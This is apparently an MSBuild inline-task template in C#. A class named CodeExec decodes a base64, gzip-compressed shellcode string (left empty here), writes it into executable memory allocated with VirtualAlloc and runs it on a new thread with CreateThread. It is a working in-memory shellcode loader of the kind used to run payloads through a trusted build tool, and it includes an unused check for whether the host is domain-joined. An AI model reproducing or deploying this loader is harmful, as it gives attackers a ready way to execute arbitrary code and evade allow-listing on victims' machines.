				<![CDATA[
				using System;
				using System.IO;
				using Microsoft.Build.Framework;
				using Microsoft.Build.Utilities;
				using System.IO.Compression;
				using System.Runtime.InteropServices;
				using System.Threading;
				using System.Net.NetworkInformation;
				public class CodeExec :  Task, ITask
				{
					public override bool Execute()
					{
					    bool joined = isDomainJoined();
					    if (true)
					    {
                            IntPtr scodeProcessHandle = IntPtr.Zero;
                            String SCode_B64 = "";
                            byte[] SCode_gzip = Convert.FromBase64String(SCode_B64);
                            byte[] SCode_c = Decompress(SCode_gzip);
                            scodeProcessHandle = exec_scode(SCode_c);
                            WaitForSingleObject(scodeProcessHandle, 0xFFFFFFFF);
                        }
                        return true;
					}
					static byte[] Decompress(byte[] data)
					{
						using (var compressedStream = new MemoryStream(data))
						using (var zipStream = new GZipStream(compressedStream, CompressionMode.Decompress))
						using (var resultStream = new MemoryStream())
						{
							zipStream.CopyTo(resultStream);
							return resultStream.ToArray();
						}
					}
					private static IntPtr exec_scode(byte[] scode)
					{
						IntPtr funcAddr = VirtualAlloc(0, (UInt32)scode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
						Marshal.Copy(scode, 0, (IntPtr)(funcAddr), scode.Length);
						IntPtr hThread = IntPtr.Zero;
						UInt32 threadId = 0;
						IntPtr pinfo = IntPtr.Zero;
						hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
						return hThread;
					}
					public static bool isDomainJoined()
                    {
                        if (string.Equals("", System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName, StringComparison.CurrentCultureIgnoreCase))
                        {
                            return false;
                        }

                        return true;
                    }
					private static UInt32 MEM_COMMIT = 0x1000;
					private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
					[DllImport("kernel32")]
					private static extern IntPtr VirtualAlloc(UInt32 lpStartAddr,
					 UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
					[DllImport("kernel32")]
					private static extern IntPtr CreateThread(
						UInt32 lpThreadAttributes,
						UInt32 dwStackSize,
						IntPtr lpStartAddress,
						IntPtr param,
						UInt32 dwCreationFlags,
						ref UInt32 lpThreadId
					);
					[DllImport("kernel32")]
					private static extern UInt32 WaitForSingleObject(
						IntPtr hHandle,
						UInt32 dwMilliseconds
					);
				}
